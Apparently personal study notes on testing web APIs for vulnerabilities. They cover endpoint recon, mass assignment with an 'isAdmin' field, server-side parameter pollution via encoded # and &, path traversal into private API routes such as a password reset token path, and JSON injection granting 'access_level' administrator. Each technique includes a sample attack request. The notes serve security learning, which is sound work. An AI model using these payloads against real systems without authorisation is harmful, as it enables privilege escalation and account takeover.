# API Testing
## API Recon
Detect API enpoint and search for documentation, for example:
```

    /api
    /swagger/index.html
    /openapi.json

```
Also fuzz locations  
We can crawl over machine-readable documentation with OpenAPI Parser extension for Burp  
Always check API endpoint accepted methods with `OPTIONS` request and always try POST PUT PATCH methods  
Also check and change `Content-Type`. This may trigger some errors, disclose some API logic and also could open way to some vulnerabilities (for example API is safe using JSON, but could accept XML and this opens potential XXE vuln)  
For this purposes we can use Conten-Type converter extension  
To detect some hidden parameters we can use Param miner extension and content discovery engagement tool  
Also it's possible to add some parameters which wasn't intended to be on some endpoint. For example, endpoint receives such request:
```
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```
And we can try to do smth like this with `PATCH` request:
```
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true,
}
```
## Server-side parameter pollution

### Truncating request
This vulnerability occurs when website uses some internal hidden API and payload from suer is encoded in parameters. So user can modify URL parameters to override some app logic or access some private data  
We can try to truncate requests with URL-encoded `#` character (and it's better to add some string after it).
```
GET /userSearch?name=peter%23foo&back=/home
```
If app doesn't throw any error, request could be truncated and we can comment out some parameters sent to API  

### Adding unintended parameters
Use URL-encoded `&` symbol to try to add some unintended parameters and investigate app response logic
```
GET /userSearch?name=peter%26foo=xyz&back=/home
```

### Adding valid parameters
If app accepts unintended parameters, we can look for hidden parameters from previous sections and try to modify them and investigate how they are processed  
```
GET /userSearch?name=peter%26email=foo&back=/home
```
Also we can override existing parameters, adding parameters with same name as valid one:
```
GET /userSearch?name=peter%26name=carlos&back=/home
```
For fuzzing we can use server-side variable name dictionary

## RESTful APIs
This type of apis use another syntax of parameters:
```
client-side:
GET /edit_profile.php?name=peter
server-side:
GET /api/private/users/peter
```
We can try to exploit it with path traversal sequences:
```
GET /edit_profile.php?name=peter%2f..%2fadmin
GET /api/private/users/peter/../admin
```
We can try to use sequence of ../../../%23 (#) to navigate outside the API root and test for common API files such as openapi.json%23
We cama lso change api version to bypass some security restrictions:
```
 username=../../v1/users/administrator/field/passwordResetToken%23 
```

## Pollution in structured data format
```
POST /myaccount
name=peter
```
This request is transformed into JSON and sent like this:
```
PATCH /users/7312/update
{"name":"peter"}
```
We can modify parameter and send something like:
```
POST /myaccount
name=peter","access_level":"administrator
```
And this request will modify resulting JSON sent to API

And vice versa example, when we are submitting JSON request:
```
POST /myaccount
{"name": "peter"}
This results into something like this on a server:
PATCH /users/7312/update
{"name":"peter"}
```
We can modify request:
```
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```
For testing we can use Backslash Powered Scanning extension  
